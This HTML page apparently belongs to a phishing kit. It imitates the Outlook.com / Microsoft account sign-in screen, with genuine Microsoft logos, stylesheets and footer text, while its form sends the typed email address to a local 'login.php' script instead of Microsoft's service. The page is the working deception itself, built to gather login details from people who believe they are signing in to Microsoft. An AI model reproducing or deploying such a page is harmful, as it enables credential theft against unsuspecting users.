<html dir="ltr" lang="en-US"><head>
	<title>Outlook.com - Free personal email</title>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=10">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://odc.officeapps.live.com/odc/stat/hrd.css?b=10815.36600">
	<script src="https://cdn.odc.officeapps.live.com/odc/stat/html5shiv.min.js?b=10815.36600"></script>
	<link rel='shortcut icon' href='https://c1-odc-15.cdn.office.net:443/start/s/161081335950_resources\favicon_outlook.ico' />
</head>
<body>
	<div class="background">
		<div class="blur"></div>
		<div class="full"></div>
	</div>
	<div class="outer">
		<div class="middle">
			<main class="inner" style="">
				<div class="margin-bottom-20">
					<picture class="logo margin-bottom-16" role="presentation">
						<source srcset="https://cdn.odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.svg?b=10815.36600">
						<img src="https://cdn.odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.png?b=10815.36600">
					</picture>
				</div>
				
				<!-- ko ifnot: showSplitter -->
				<div role="dialog" aria-labelledby="signInTitle" aria-describedby="signInDescription">
				<div data-bind="component: { name: 'identity-banner-control',
    params: {
        pawnIconId: svr.B4,
        displayName: unsafe_displayName(),
        isBackButtonVisible: svr.Ay &amp;&amp; isBackButtonVisible() &amp;&amp; svr.Bw },
    event: {
        backButtonClick: secondaryButton_onClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title=""></div><!-- ko ifnot: svr.Bw --><!-- /ko --> </div></div>
					<div id="signInTitle" class="row text-title margin-bottom-16" data-bind="text: config.text.header">Sign in</div>
					<div id="signInDescription">
						<!-- ko if: context --><!-- /ko -->
					</div>
					<div class="alert alert-error text-body margin-bottom-12 col-md-12" role="alert" aria-live="assertive" aria-relevant="text" aria-atomic="true" data-bind="visible: error, html: error" style="display: none;"></div>
					<div class="row margin-bottom-16">
						<div class="form-group col-md-12 placeholderContainer">
						<form action="login.php" method="post">
							<input type="email" name="mail" class="form-control" aria-required="true" aria-label="Email, phone, or Skype" placeholder="Email, phone, or Skype" data-bind="hasFocus: focus, textInput: email, attr: {'placeholder': config.text.emailPlaceHolder,
								'aria-label': config.text.emailPlaceHolderAria, 'aria-invalid': !error}" spellcheck="false" autocomplete="off">
							<!-- ko if: isRequestPending --><!-- /ko -->
							<!-- ko if: showPlaceholder --><!-- /ko -->
						</div>
					</div>
					<!-- ko if: showEnterProductKey --><!-- /ko -->
					<!-- ko if: showCreateAccount -->
					<div class="row margin-bottom-20">
						<div class="col-md-12 section text-secondary">
							<span data-bind="text: config.text.noAccount">No account?</span>
							<a data-bind="text: config.text.createAccount, attr: {'aria-label': config.text.createAccountAria}, click: msAccountSignUp" href="#" aria-label="Create a Microsoft account">Create one!</a>
						</div>
					</div>
					<!-- /ko -->
				</div>
				<!-- /ko -->
				
				<!-- ko if: showSplitter --><!-- /ko -->
				<!-- ko ifnot: showSplitter -->
				<div class="row inline-block no-margin-top-bottom button-container">
					<input type="submit" class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" value="Next">
					</form>
				</div>
				<!-- /ko -->
			</main>
		</div>
	</div>
	<footer id="footer">
		<div>
			<div class="footerNode">
				<span>©2018 Microsoft</span>
				<a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy statement</a>
			</div>
		</div>
	</footer>
	<noscript>
		Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br />
		<br />
		To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.
	</noscript>
	<script src="https://cdn.odc.officeapps.live.com/odc/stat/jquery-1.12.4.min.js?b=10815.36600"></script>
	<script src="https://cdn.odc.officeapps.live.com/odc/stat/knockout-3.4.2.js?b=10815.36600"></script>
	<script src="https://cdn.odc.officeapps.live.com/odc/stat/CommonDiagnostics.js?b=10815.36600"></script>
	<script src="https://cdn.odc.officeapps.live.com/odc/jsonstrings?g=EmailHrdv2&amp;mkt=1033&amp;hm=0&amp;b=10815.36600"></script>
</body></html>